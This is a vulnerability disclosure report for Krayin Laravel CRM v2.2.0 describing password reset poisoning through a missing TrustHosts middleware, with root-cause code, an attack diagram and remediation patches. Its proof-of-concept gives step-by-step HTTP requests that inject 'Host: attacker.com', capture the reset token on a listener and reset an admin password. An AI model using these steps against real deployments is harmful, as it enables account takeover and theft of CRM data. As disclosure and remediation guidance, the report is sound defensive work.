# Security Vulnerability Report

## Password Reset Poisoning via Host Header Injection
### Krayin Laravel CRM — Missing `TrustHosts` Middleware

---

| Field                  | Details                                                                          |
|------------------------|----------------------------------------------------------------------------------|
| **Product**            | Krayin Laravel CRM                                                               |
| **Version**            | v2.2.0 (latest as of 14 April 2026)                                              |
| **Repository**         | https://github.com/krayin/laravel-crm                                            |
| **Affected Files**     | `bootstrap/app.php`, `packages/Webkul/Admin/src/Notifications/User/UserResetPassword.php`, `packages/Webkul/Admin/src/Resources/views/emails/users/forget-password.blade.php` |
| **Vulnerable Route**   | `POST /admin/forgot-password`                                                    |
| **Vulnerability Type** | Host Header Injection → Password Reset Poisoning → Account Takeover             |
| **CVSS v3.1 Score**    | **7.5 (High)** — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`                        |
| **CWE**                | [CWE-640](https://cwe.mitre.org/data/definitions/640.html) — Weak Password Recovery Mechanism |
| **Report Date**        | 14 April 2026                                                                    |
| **Status**             | Confirmed — Static code analysis verified                                        |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Attack Flow](#3-attack-flow)
4. [Proof of Concept](#4-proof-of-concept)
5. [Impact](#5-impact)
6. [Remediation](#6-remediation)
7. [References](#7-references)

---

## 1. Executive Summary

Krayin Laravel CRM v2.2.0 does not register Laravel's `TrustHosts` middleware. As a result, the password reset notification email generates its reset URL using the attacker-controlled `Host` header of the incoming request rather than the application's configured base URL.

An unauthenticated attacker can submit a password reset request on behalf of any known user while injecting a malicious hostname into the `Host` header. The victim receives an email containing a reset link pointing to the attacker's domain. When the victim clicks the link, the password reset token is delivered to the attacker, who can then complete the reset and take over the account — including administrator accounts.

---

## 2. Root Cause Analysis

### 2.1 Missing `TrustHosts` Middleware

Laravel ships with an `Illuminate\Http\Middleware\TrustHosts` middleware that restricts which `Host` header values the application will accept. It is **not registered** in this application:

```php
// bootstrap/app.php — current state (vulnerable)
->withMiddleware(function (Middleware $middleware) {
    $middleware->append(CanInstall::class);
    // ❌ TrustHosts is NOT registered
})
```

Without this middleware, Laravel's `UrlGenerator` may use the `Host` request header to construct absolute URLs when generating named routes.

### 2.2 Reset URL Generated from `route()` Inside Email Template

The password reset email is rendered at request time. The view calls `route()` which resolves to an absolute URL using the current HTTP request's host:

```php
// packages/Webkul/Admin/src/Notifications/User/UserResetPassword.php
public function toMail($notifiable)
{
    return (new MailMessage)
        ->view('admin::emails.users.forget-password', [
            'user_name' => $notifiable->name,
            'token'     => $this->token,
        ]);
}
```

```blade
{{-- packages/Webkul/Admin/src/Resources/views/emails/users/forget-password.blade.php --}}
<a href="{{ route('admin.reset_password.create', $token) }}">
    Reset Password
</a>
```

`route('admin.reset_password.create', $token)` generates a fully-qualified URL. When `APP_URL` is not correctly configured for the deployment environment or when `TrustHosts` is absent, Laravel's `UrlGenerator` falls back to `$request->getSchemeAndHttpHost()` — the value of which is directly derived from the HTTP `Host` header.

### 2.3 `APP_URL` Is Not a Sufficient Mitigation

Even when `APP_URL` is set, the absence of `TrustHosts` means the application still **accepts and processes requests** with arbitrary `Host` header values. In certain proxy and load-balancer configurations, the `UrlGenerator` may override the configured root URL with the incoming host, making `APP_URL` alone an unreliable defence.

---

## 3. Attack Flow

```
Attacker                           CRM Server                        Victim
   │                                    │                               │
   │  POST /admin/forgot-password       │                               │
   │  Host: attacker.com                │                               │
   │  email: victim@company.com    ────►│                               │
   │                                    │                               │
   │                                    │  route() uses Host header:    │
   │                                    │  URL = https://attacker.com/  │
   │                                    │  admin/reset-password/{token} │
   │                                    │                               │
   │                                    │──── Email dispatched ────────►│
   │                                    │                               │
   │                                    │        Victim clicks the link │
   │◄───────────────────────────────────────────────────────────────────│
   │                                    │                               │
   │  Attacker captures {token}         │                               │
   │                                    │                               │
   │  POST /admin/reset-password        │                               │
   │  token={stolen}               ────►│                               │
   │  password=attacker_password        │  ✅ Password changed          │
   │                                    │  ✅ Session created           │
   │◄─── Redirect to dashboard ─────────│                               │
   │                                    │                               │
   │  Account Takeover complete         │                               │
```

---

## 4. Proof of Concept

### Step 1 — Request a Password Reset with a Poisoned Host

First, obtain a valid CSRF token by visiting `/admin/forgot-password`. Then submit:

```http
POST /admin/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Cookie: krayin_crm_session=<session_from_visit>

_token=<csrf_token>&email=admin@target.com
```

### Step 2 — Victim Receives a Poisoned Email

The victim's inbox will contain an email with the following reset button URL:

```
https://attacker.com/admin/reset-password/<RESET_TOKEN>
```

### Step 3 — Token Capture on Attacker Server

The attacker hosts a simple listener on `attacker.com` that logs incoming requests:

```bash
# On attacker.com
python3 -m http.server 443
# Logs: GET /admin/reset-password/abc123def456...
```

### Step 4 — Complete Account Takeover

Using the captured token, the attacker resets the victim's password on the legitimate server:

```http
POST /admin/reset-password HTTP/1.1
Host: demo.krayincrm.com
Content-Type: application/x-www-form-urlencoded

_token=<valid_csrf>&token=<stolen_token>&email=admin@target.com
&password=hacked1234&password_confirmation=hacked1234
```

**Result:** The attacker is now authenticated as the victim, including full administrator access if the targeted account has admin privileges.

POC Video:


https://github.com/user-attachments/assets/e886b381-d3b5-4c77-9dd2-fde29f53fa1c


---

## 5. Impact

| Dimension          | Description                                                                 |
|--------------------|-----------------------------------------------------------------------------|
| **Account Takeover** | Any CRM account (including admin) can be taken over without prior authentication |
| **Confidentiality** | Full access to leads, contacts, deals, emails, and configuration data      |
| **Integrity**       | Modify or delete CRM records, change email templates, alter automation rules |
| **No Authentication Required** | Exploit requires only knowledge of a target's email address      |
| **Scalability**     | Attack can be automated against all known user email addresses              |

**Attack prerequisite:** The attacker only needs to know the email address of a registered CRM user — no credentials, no existing session.

---

## 6. Remediation

### 6.1 Register `TrustHosts` Middleware (Primary Fix)

Create the middleware class:

```php
<?php
// app/Http/Middleware/TrustHosts.php

namespace App\Http\Middleware;

use Illuminate\Http\Middleware\TrustHosts as Middleware;

class TrustHosts extends Middleware
{
    public function hosts(): array
    {
        return [
            $this->allSubdomainsOfApplicationUrl(),
        ];
    }
}
```

Register it as the **first** middleware in `bootstrap/app.php`:

```php
->withMiddleware(function (Middleware $middleware) {
    $middleware->prepend(\App\Http\Middleware\TrustHosts::class); // ✅ Add this
    $middleware->append(CanInstall::class);
    // ...
})
```

### 6.2 Hardcode the Reset URL in the Notification (Defense-in-Depth)

Override `toMail()` in `UserResetPassword` to use the configured `APP_URL`:

```php
public function toMail($notifiable)
{
    $resetUrl = rtrim(config('app.url'), '/') . '/' . ltrim(
        route('admin.reset_password.create', $this->token, false), '/'
    );

    return (new MailMessage)
        ->view('admin::emails.users.forget-password', [
            'user_name' => $notifiable->name,
            'token'     => $this->token,
            'reset_url' => $resetUrl,
        ]);
}
```

Update the blade template to use `$reset_url` instead of `route(...)`:

```blade
<a href="{{ $reset_url }}">Reset Password</a>
```

### 6.3 Ensure `APP_URL` Is Correctly Set in Production

```env
# .env
APP_URL=https://demo.krayincrm.com
```

---

## 7. References

- [CWE-640 — Weak Password Recovery Mechanism for Forgotten Password](https://cwe.mitre.org/data/definitions/640.html)
- [PortSwigger — Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)
- [Laravel Documentation — TrustHosts Middleware](https://laravel.com/docs/middleware#trusting-hosts)
- [OWASP — Testing for Account Enumeration and Guessable User Account (OTG-IDENT-004)](https://owasp.org/www-project-web-security-testing-guide/)
- Affected source: `bootstrap/app.php`, `packages/Webkul/Admin/src/Notifications/User/UserResetPassword.php`
